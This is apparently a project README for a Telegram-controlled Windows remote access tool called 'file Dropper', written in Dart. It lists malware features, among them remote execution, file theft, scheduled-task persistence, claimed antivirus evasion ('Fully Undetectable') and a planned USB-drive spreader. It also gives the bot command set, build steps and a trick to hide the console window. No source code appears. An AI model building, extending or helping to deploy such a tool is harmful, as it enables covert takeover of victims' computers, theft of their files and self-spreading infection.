# file Dropper

## Table of Contents

- [About](#about)
- [Features](#getting_started)
- [Usage](#usage)


## About <a name = "about"></a>

Windows file Dropper and (file Manager)  using Telegram.
this program will allow yout to download and upload files to any windows computer without port forwarding useing telegram  and also is Fully encrypted means (The data being exchanged cannot be spied upon using MITM tools).

## Features  <a name = "getting_started"></a>

* upload File
* download File
* excute .exe remotly
* navigate File System
* autoRun (Using schtasks)
* Fud (Fully Undetectable)
* multi client (program will genrate client id at first connection)
* [Todo] automatic file Graber
* [Todo] Spreader (re Infect Flash drives)



### Prerequisites

Dart Sdk.


```
use only in Windows platform.
```

### Installing
go to https://dart.dev/get-dart#install.
install dart-SDK


## Usage <a name = "usage"></a>
```
commands:
*************** Note Evry Single  Command Should be Seprated with Space ***************
* /online {use this command to get all connected users and their IDs}.
* /cd [path] [userID] {use This Command to change currunt dir }
* /getUser [id] {
    use This command to get userName
}

* /getFile [filePath with Name] [userId] {
    use This Command to Get A file from Computer
}
* /pwd [userId] {
    get Current Working directory
}
* /run [programPath] [userID] {
    Execute Program remotly 
}

```
go to program Directory /source.
* Change const.dart file line 6 with your Own telegram bot api.
* Compile using  [ dart2native bin/drop_it.dart -o bin/myApp.exe].
* -*** Note change your Const.dart programid to your compiled program Name.
* use this command to hide console while app is running [editbin.exe /subsystem:windows {yourapp}.exe]

editbin.exe is apart of  the microsoft Visual studio 2019 {if this is not working  find it in Visual studio 2019 installed dir }

![alt text](https://i.ibb.co/kcjLr5S/result.png)



